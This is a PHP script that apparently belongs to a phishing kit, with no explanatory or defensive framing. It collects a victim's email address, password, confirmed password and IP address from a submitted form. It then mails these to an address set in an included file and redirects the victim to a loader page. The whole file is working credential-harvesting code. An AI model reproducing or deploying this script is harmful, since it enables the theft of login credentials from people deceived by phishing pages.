<?
                                                                                                                                                                                 

                                                   
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['m1']."\n";
$message .= "Password : ".$_POST['m2']."\n";
$message .= "Confirm Password : ".$_POST['m3']."\n";
$message .= "Client IP : ".$ip."\n";
include("Geodata/_Mail_State_List.php");


mail($send,$subject,$message,$headers);


$redirect = "loader.php";

header("Location: " . $redirect);
 
?>